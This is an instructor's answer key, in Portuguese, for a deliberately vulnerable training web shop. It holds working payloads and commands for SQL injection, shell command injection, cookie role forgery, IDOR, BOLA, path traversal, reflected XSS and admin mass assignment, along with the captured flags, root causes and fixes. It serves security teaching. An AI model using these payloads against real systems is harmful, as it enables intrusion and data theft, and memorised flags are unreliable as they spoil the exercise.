# Gabarito — VulnShop

> Material do instrutor. Não distribua para os alunos.

A VulnShop está em **http://localhost:8012** e usa dois containers:

- `vulnshop`: aplicação principal, banco SQLite em `/tmp`, notas fiscais e cinco flags.
- `shipping-service`: serviço interno de frete, sem porta publicada, com a flag de Command Injection.

## Resumo das flags

| Desafio | Vulnerabilidade | Flag |
|---------|-----------------|------|
| Busca oculta | SQL Injection | `flag{sql1_s3arch_h1dd3n}` |
| Frete sob demanda | Command Injection | `flag{cmdi_fr3t3_c4lc}` |
| Sessão de administrador | Cookie sem assinatura | `flag{c00k13s_r0l3_adm1n}` |
| Pedido alheio | IDOR | `flag{1d0r_0rd3r_1001}` |
| API de pedidos | BOLA | `flag{b0l4_4p1_0rd3r_1003}` |
| Nota fiscal indiscreta | Path Traversal | `flag{p4th_tr4v3rs4l_1nv01c3}` |

## Preparação

Faça login com a conta de demonstração e guarde o cookie em um arquivo:

```bash
BASE=http://localhost:8012
curl -sS -c /tmp/vs_cookies -X POST "$BASE/login" \
  -d 'username=demo&password=demo123' -o /dev/null
```

Confira se a sessão foi criada:

```bash
curl -sS -b /tmp/vs_cookies "$BASE/profile" | grep -o 'demo@vulnshop.local'
```

A conta `alice` / `alice123` também existe e é útil para comparar pedidos.

---

## 1. Busca oculta — SQL Injection

**Flag:** `flag{sql1_s3arch_h1dd3n}`

### Passo a passo

1. A busca normal fica em `/search?q=`. O código monta a consulta por concatenação:

   ```python
   sql = (
       "SELECT id, name, description, price, stock, icon FROM products "
       "WHERE visible = 1 AND (name LIKE '%"
       + query
       + "%' OR description LIKE '%"
       + query
       + "%') ORDER BY id"
   )
   ```

2. Uma aspa simples quebra a consulta. Para retornar o produto oculto (`visible = 0`), feche a cláusula `LIKE` e o parêntese e use `UNION SELECT` com a mesma quantidade de colunas (6):

   ```text
   %') UNION SELECT id,name,description,price,stock,icon FROM products WHERE visible=0 -- 
   ```

3. Execute com `curl` (o `--data-urlencode` preserva o espaço depois de `--`):

   ```bash
   curl -sS -G "$BASE/search" \
     --data-urlencode "q=%') UNION SELECT id,name,description,price,stock,icon FROM products WHERE visible=0 -- " \
     | grep -o 'flag{[^}]*}'
   ```

4. Saída:

   ```text
   flag{sql1_s3arch_h1dd3n}
   ```

Também é possível ver o produto “Relatório interno — Auditoria” no HTML da resposta.

### Causa raiz

A entrada do usuário é concatenada diretamente na consulta SQL. O atacante controla a estrutura da consulta, não apenas o valor buscado. O produto oculto depende apenas do filtro `visible = 1`, que pode ser removido pela injeção.

### Correção

- Usar consultas parametrizadas:

  ```python
  sql = """
      SELECT id, name, description, price, stock, icon
      FROM products
      WHERE visible = 1
        AND (name LIKE ? OR description LIKE ?)
      ORDER BY id
  """
  term = f"%{query}%"
  rows = fetch_all(sql, (term, term))
  ```

- Nunca concatenar entrada em SQL.
- Aplicar allowlist de colunas e ordenação quando forem dinâmicas.
- Restringir o usuário do banco e separar dados internos em outra tabela/ serviço.
- Não depender de filtros de aplicação para esconder dados sensíveis.

---

## 2. Frete sob demanda — Command Injection

**Flag:** `flag{cmdi_fr3t3_c4lc}`

### Passo a passo

1. Faça login e abra `/shipping`, ou envie diretamente:

   ```bash
   curl -sS -b /tmp/vs_cookies -X POST "$BASE/shipping" \
     --data-urlencode 'cep=127.0.0.1; cat /tmp/flag.txt #' \
     --data-urlencode 'weight=1' \
     | grep -o 'flag{[^}]*}'
   ```

2. O `shipping-service` monta o comando:

   ```python
   command = f"bash /app/scripts/frete.sh {cep} {weight}"
   subprocess.run(command, shell=True, ...)
   ```

3. Com o payload, o shell executa:

   ```bash
   bash /app/scripts/frete.sh 127.0.0.1; cat /tmp/flag.txt # 1
   ```

4. Saída:

   ```text
   flag{cmdi_fr3t3_c4lc}
   ```

5. A saída do comando é devolvida no campo `output` da resposta e aparece no `<pre>` da página.

### Isolamento didático

O container `shipping-service` recebe somente `FLAG_CMDI`. O container principal recebe as demais flags, mas **não** recebe `FLAG_CMDI`. Portanto, o Command Injection não permite ler o banco, as notas fiscais ou as outras flags da loja.

Verificação para o instrutor:

```bash
docker compose exec -T vulnshop env | grep '^FLAG'
docker compose exec -T shipping-service env | grep '^FLAG'
```

### Causa raiz

A entrada é concatenada em um comando interpretado por um shell (`shell=True`). Metacaracteres como `;`, `&&`, `|`, `$()` e crases permitem executar comandos arbitrários.

### Correção

- Não usar `shell=True`.
- Passar os argumentos como lista, sem interpolação:

  ```python
  subprocess.run(
      ["bash", "/app/scripts/frete.sh", cep, weight],
      capture_output=True,
      text=True,
      timeout=5,
  )
  ```

- Validar o CEP com uma allowlist (`^[0-9]{5}-?[0-9]{3}$`) e o peso como número dentro de limites.
- Executar o serviço com usuário sem privilégios e filesystem somente leitura (já configurado).
- Manter segredos fora do container que processa entrada não confiável, sempre que possível.
- Preferir uma biblioteca de cálculo em vez de chamar shell/script.

---

## 3. Sessão de administrador — cookie sem assinatura

**Flag:** `flag{c00k13s_r0l3_adm1n}`

### Passo a passo

1. Faça login com `demo` / `demo123`.

2. Inspecione o cookie `shop_session` no DevTools ou via `curl`:

   ```bash
   cat /tmp/vs_cookies | grep shop_session
   ```

   O valor é algo como:

   ```text
   eyJ1aWQiOjIsInVzZXJuYW1lIjoiZGVtbyIsInJvbGUiOiJjdXN0b21lciJ9
   ```

3. Decodifique:

   ```bash
   python3 - <<'PY'
   import base64, json
   value = "eyJ1aWQiOjIsInVzZXJuYW1lIjoiZGVtbyIsInJvbGUiOiJjdXN0b21lciJ9"
   data = json.loads(base64.urlsafe_b64decode(value + "=" * (-len(value) % 4)))
   print(data)
   PY
   ```

   Saída:

   ```text
   {'uid': 2, 'username': 'demo', 'role': 'customer'}
   ```

4. Altere `role` para `admin` e recodifique:

   ```bash
   python3 - <<'PY'
   import base64, json
   value = "eyJ1aWQiOjIsInVzZXJuYW1lIjoiZGVtbyIsInJvbGUiOiJjdXN0b21lciJ9"
   data = json.loads(base64.urlsafe_b64decode(value + "=" * (-len(value) % 4)))
   data["role"] = "admin"
   novo = base64.urlsafe_b64encode(
       json.dumps(data, separators=(",", ":")).encode()
   ).rstrip(b"=").decode()
   print(novo)
   PY
   ```

5. Use o cookie adulterado:

   ```bash
   NOVO='eyJ1aWQiOjIsInVzZXJuYW1lIjoiZGVtbyIsInJvbGUiOiJhZG1pbiJ9'
   curl -sS -b "shop_session=$NOVO" "$BASE/admin" | grep -o 'flag{[^}]*}'
   ```

6. Saída:

   ```text
   flag{c00k13s_r0l3_adm1n}
   ```

### Causa raiz

O cookie é apenas base64 de um JSON, sem assinatura ou criptografia. O servidor confia em `uid`, `username` e principalmente `role` sem validar no banco. Base64 não é proteção: qualquer cliente pode decodificar, alterar e recodificar.

### Correção

- Nunca confiar em papel/role vindo do cliente.
- Manter o estado da sessão no servidor ou usar cookie assinado (Flask `session` com `itsdangerous`, por exemplo).
- Carregar o usuário e o papel do banco a cada requisição autorizada.
- Usar `HttpOnly`, `Secure` e `SameSite` adequados:

  ```python
  response.set_cookie("session", value, httponly=True, secure=True, samesite="Lax")
  ```

- Invalidar sessão no logout e após mudança de privilégio.
- Aplicar autorização no servidor em todas as rotas administrativas.

---

## 4. Pedido alheio — IDOR

**Flag:** `flag{1d0r_0rd3r_1001}`

### Passo a passo

1. Faça login com `demo` e abra `/orders`.

2. O pedido da conta `demo` é o `1002`. Os IDs são sequenciais:

   ```text
   /orders/1001  → Alice
   /orders/1002  → demo
   /orders/1003  → admin
   /orders/1004  → Bruno
   ```

3. Acesse o pedido da Alice:

   ```bash
   curl -sS -b /tmp/vs_cookies "$BASE/orders/1001" | grep -o 'flag{[^}]*}'
   ```

4. Saída:

   ```text
   flag{1d0r_0rd3r_1001}
   ```

5. A página mostra o pedido como se fosse do usuário logado, incluindo a observação de atendimento da Alice.

### Causa raiz

A rota verifica apenas se existe uma sessão válida. Não verifica se `order.user_id` corresponde ao usuário autenticado. É um IDOR clássico: o identificador do objeto é previsível e a autorização é ausente.

### Correção

- Sempre verificar a propriedade no servidor:

  ```python
  order = fetch_one(
      "SELECT * FROM orders WHERE id = ? AND user_id = ?",
      (order_id, g.user["uid"]),
  )
  if order is None:
      abort(404)
  ```

- Usar identificadores não sequenciais (UUID) quando fizer sentido, mas não como substituto da autorização.
- Centralizar a checagem de autorização em uma função/decorator.
- Retornar 404 em vez de 403 para não confirmar a existência de recursos de outros usuários.
- Registrar acessos negados para monitoramento.

---

## 5. API de pedidos — BOLA

**Flag:** `flag{b0l4_4p1_0rd3r_1003}`

### Passo a passo

1. Abra `/api` ou `/profile` e copie a chave da conta `demo`:

   ```text
   vulnshop-demo-7a3f9c21
   ```

2. Consulte um pedido da própria conta:

   ```bash
   curl -sS -H "X-API-Key: vulnshop-demo-7a3f9c21" \
     "$BASE/api/v1/orders/1002" | python3 -m json.tool
   ```

3. Agora consulte o pedido `1003`, que pertence ao administrador:

   ```bash
   curl -sS -H "X-API-Key: vulnshop-demo-7a3f9c21" \
     "$BASE/api/v1/orders/1003" | python3 -m json.tool
   ```

4. A resposta inclui `owner` diferente e o campo `internal_note`:

   ```text
   flag{b0l4_4p1_0rd3r_1003} — Nota interna restrita ao time de operações. Não divulgar.
   ```

5. Extraindo apenas a flag:

   ```bash
   curl -sS -H "X-API-Key: vulnshop-demo-7a3f9c21" \
     "$BASE/api/v1/orders/1003" | grep -o 'flag{[^}]*}'
   ```

### Causa raiz

A API autentica a chave, mas não autoriza o acesso ao objeto. Qualquer chave válida pode consultar qualquer pedido pelo ID, incluindo notas internas. É o equivalente API do IDOR (BOLA — Broken Object Level Authorization).

### Correção

- Filtrar pelo dono da chave:

  ```python
  order = fetch_one(
      "SELECT * FROM orders WHERE id = ? AND user_id = ?",
      (order_id, user["id"]),
  )
  ```

- Nunca retornar `internal_note` para clientes comuns; separar a resposta pública da resposta administrativa.
- Aplicar autorização por objeto em todos os endpoints, incluindo listagens, atualizações e exclusões.
- Usar escopos na chave de API e registrar acessos negados.
- Testar a API com duas contas diferentes (matriz de autorização).

---

## 6. Nota fiscal indiscreta — Path Traversal

**Flag:** `flag{p4th_tr4v3rs4l_1nv01c3}`

### Passo a passo

1. Faça login e abra um pedido, por exemplo `/orders/1002`.

2. Clique em “Baixar nota fiscal”. A URL é:

   ```text
   /invoices/download?file=invoice-1002.txt
   ```

3. As notas ficam em `/tmp/invoices` e a flag está em `/tmp/invoice-flag.txt`. Use `../` para subir um nível e manter a extensão `.txt`:

   ```bash
   curl -sS -b /tmp/vs_cookies \
     "$BASE/invoices/download?file=../invoice-flag.txt"
   ```

4. Saída:

   ```text
   flag{p4th_tr4v3rs4l_1nv01c3}
   ```

### Causa raiz

O código valida apenas a extensão:

```python
if not filename.endswith(".txt"):
    return "Somente arquivos .txt são permitidos.", 400
path = Path(os.path.join(str(db.INVOICE_DIR), filename))
```

`../` permite sair de `/tmp/invoices`. A extensão `.txt` não impede o traversal, e o caminho não é normalizado nem confinado ao diretório permitido.

### Correção

- Resolver o caminho e verificar se ele continua dentro do diretório permitido:

  ```python
  base = Path("/tmp/invoices").resolve()
  path = (base / filename).resolve()
  if base not in path.parents:
      abort(404)
  ```

- Usar `Path(filename).name` para aceitar apenas o nome do arquivo, sem diretórios.
- Não usar nomes fornecidos pelo cliente para montar caminhos; usar IDs internos e mapear para nomes gerados pelo servidor.
- Validar extensão e conteúdo, mas nunca como única barreira.
- Rodar com filesystem somente leitura e manter arquivos sensíveis fora do diretório de uploads/downloads.

---

## Vulnerabilidades extras

### XSS refletido na busca

O termo de busca é renderizado com `|safe` em `search.html`:

```django
<strong>{{ query|safe }}</strong>
```

Teste:

```bash
curl -sS -G "$BASE/search" \
  --data-urlencode 'q=<script>alert(document.cookie)</script>' \
  | grep -o '<script>alert(document.cookie)</script>'
```

O cookie `shop_session` não usa `HttpOnly`, então o JavaScript consegue lê-lo. Em um navegador, o alerta mostra o conteúdo da sessão.

**Correção:** remover `|safe`, deixar o escape automático do Jinja2 ativo, usar CSP e marcar cookies como `HttpOnly`.

### Open redirect no login

O login usa o parâmetro `next` sem validar o domínio:

```bash
curl -sS -i -X POST "$BASE/login" \
  -d 'username=demo&password=demo123&next=https://example.com/' \
  | grep -i '^Location:'
```

Saída:

```text
Location: https://example.com/
```

**Correção:** aceitar apenas caminhos relativos internos ou uma allowlist de hosts; nunca redirecionar para URLs arbitrárias.

### Mass assignment no cadastro

A interface envia `role=customer` como campo oculto, mas o servidor aceita qualquer valor:

```bash
curl -sS -i -c /tmp/vs_mass_cookie -X POST "$BASE/register" \
  -d 'username=eviladmin&password=evil123&email=evil@example.com&role=admin'
```

O cookie retornado já contém `"role":"admin"`, e `/admin` fica acessível.

**Correção:** nunca aceitar `role` do formulário; definir o papel no servidor, usar allowlist de campos e um DTO/schema de entrada.

### CSRF

O carrinho, o checkout e o logout são POSTs sem token anti-CSRF. Um site externo pode enviar um formulário para a loja usando o cookie da vítima.

**Correção:** usar token anti-CSRF por sessão, `SameSite` adequado e validar `Origin`/`Referer` em operações sensíveis.

### Senhas em texto puro

O seed de `db.py` guarda as senhas diretamente. Isso é intencional para o laboratório, mas não deve ser reproduzido.

**Correção:** usar Argon2id, bcrypt ou scrypt com salt único; nunca armazenar senha em texto puro ou com hash rápido (MD5/SHA-1).

### Chave de API exposta

A chave aparece no perfil e a chave de `demo` aparece na documentação pública. Isso é proposital para o exercício de BOLA, mas em um sistema real a chave deve ser tratada como segredo, rotacionável e com escopos mínimos.

---

## Verificação de isolamento

O instrutor pode confirmar que o Command Injection não alcança as outras flags:

```bash
docker compose exec -T vulnshop env | grep '^FLAG'
docker compose exec -T shipping-service env | grep '^FLAG'
```

Esperado:

- `vulnshop`: `FLAG_SQLI`, `FLAG_ADMIN`, `FLAG_IDOR`, `FLAG_BOLA`, `FLAG_TRAVERSAL`.
- `shipping-service`: apenas `FLAG_CMDI`.

A imagem do frete é construída a partir de `shipping.Dockerfile` e contém apenas `shipping_service.py`, `scripts/frete.sh` e `requirements.txt`. O código da loja, o banco e os documentos não estão disponíveis nesse container:

```bash
docker compose exec -T shipping-service find /app -maxdepth 2 -type f
```

Também é possível confirmar que o `shipping-service` não publica porta no host:

```bash
docker compose ps
```

A coluna `PORTS` do serviço interno deve mostrar apenas `8000/tcp`, sem `127.0.0.1:...`.

## Reset

```bash
docker compose up -d --force-recreate vulnshop shipping-service
```

O banco, as notas fiscais e os arquivos de flag são recriados em `/tmp`.

## Tempo estimado

- SQL Injection: 10–20 min
- Command Injection: 15–25 min
- Cookie: 10–20 min
- IDOR: 10–15 min
- BOLA: 15–25 min
- Path Traversal: 10–20 min
- Extras: 20–40 min

Sugestão de condução: percorra o fluxo normal da loja primeiro, depois apresente cada falha, discuta a causa raiz e finalize com a correção correspondente. O objetivo é mostrar como uma aplicação “funcional” pode ter autorização, validação e segredos mal distribuídos.
